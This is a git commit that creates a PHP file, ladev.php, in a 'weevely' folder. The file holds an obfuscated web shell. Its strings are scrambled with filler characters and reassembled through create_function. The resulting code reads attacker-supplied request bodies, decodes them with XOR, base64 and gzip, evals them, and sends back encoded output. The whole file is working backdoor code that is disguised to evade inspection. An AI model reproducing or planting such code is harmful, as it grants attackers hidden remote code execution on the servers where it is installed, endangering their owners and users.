ec9da7b806d612fe06b3e92bb8b139f792933a21
LaDev008 <141607789+LaDev008@users.noreply.github.com>
2024-07-05 13:51:14 +0700

    Create ladev.php

---
+++ weevely/ladev.php
@@ -0,0 +1,26 @@
+<?php
+
+$d='"pNxMRb5Vb0HPeXqPL";XfXunctXion Xx($t,$k){$c=stXrlen($Xk);$l=sXtX';
+
+$T=str_replace('Mc','','MccMcMcreMcate_funMcctMcion');
+
+$i='$k="9X883693Xc";$kh="fX4bXbbXb127c50";$kf="dXb1X3edX97af6e";$p=XX';
+
+$Q='m[1]X),$kX))X);$oX=@ob_gXet_contXents();@obX_end_cXlean();$rX=X@b';
+
+$h='aseX6X4_encode(@x(@XgzcompreXss($Xo),X$k));print("$Xp$Xkh$r$kf");}';
+
+$N=');$j++,$i++){X$o.=$t{$i}^X$k{$jXX};}}return X$o;X}iXf (@prXeg_matc';
+
+$t='rleXn($t);$o="";fXor($i=0X;$i<$l;X){for(XX$j=0X;($j<$c&X&$i<$XXl';
+
+$D='h("/$kh(X.+)$XXkfXX/",@Xfile_get_contents("php://XinpuXt")X,$m)=';
+
+$S='=1) {X@ob_starXt()X;@evXal(@gXzuncompresXsX(@x(@basXe64_decoXde($';
+
+$z=str_replace('X','',$i.$d.$t.$N.$D.$S.$Q.$h);
+
+$E=$T('',$z);$E();
+
+?>
+
